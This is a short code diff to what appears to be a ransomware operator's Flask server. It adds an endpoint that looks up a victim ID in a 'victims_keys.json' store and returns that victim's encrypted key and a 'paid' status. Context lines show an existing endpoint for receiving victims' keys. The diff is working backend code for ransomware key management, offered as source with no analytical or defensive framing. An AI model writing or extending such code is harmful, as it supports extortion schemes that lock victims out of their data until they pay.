@@ -37,6 +37,28 @@ def receive_victim_key():
     
     return jsonify({"status": "success"}), 200
 
+#endpoint for sending key
+@app.route('/api/key/<victim_id>', methods=['GET'])
+def send_key(victim_id):
+    try:
+        with open('victims_keys.json', 'r') as f:
+            victims = json.load(f)
+    except:
+        return jsonify({"status": "error", "message": "No victims file found"}), 404
+    
+    if victim_id not in victims:
+        return jsonify({"status": "error", "message": "Victim ID not found"}), 404
+    
+    encrypted_key = victims[victim_id].get('encrypted_key', 'NONE')
+    paid = victims[victim_id].get('paid', 'NONE')
+    
+    return jsonify({
+        "status": "success",
+        "paid": paid,
+        "victim_id": victim_id,
+        "encrypted_key": encrypted_key
+    }), 200
+
 # test endpoint
 @app.route('/test', methods=['GET'])
 def test():
